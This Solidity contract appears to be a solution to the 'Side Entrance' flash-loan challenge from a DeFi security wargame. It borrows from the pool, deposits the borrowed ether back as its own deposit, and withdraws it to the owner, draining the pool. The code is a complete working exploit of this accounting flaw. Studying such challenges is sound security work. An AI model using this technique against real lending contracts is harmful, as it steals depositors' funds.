// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
}
/**
 *
 */
contract ReceiverSideEntrance {
    using Address for address payable;

    SideEntranceLenderPool private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        owner = msg.sender;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "Sender must be pool");
        pool.deposit{value: msg.value}();
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }

    function withdraw() external payable {
        require(msg.sender == owner, "Sender has no privilidge");
        pool.withdraw();
        //payable(msg.sender).transfer(address(this).balance);
        (bool success, ) = msg.sender.call{ value: address(this).balance }("");
        require(success, "Address: unable to send value, recipient may have reverted2");
    }

    //function fallback() external payable{}
    receive() external payable {}
}
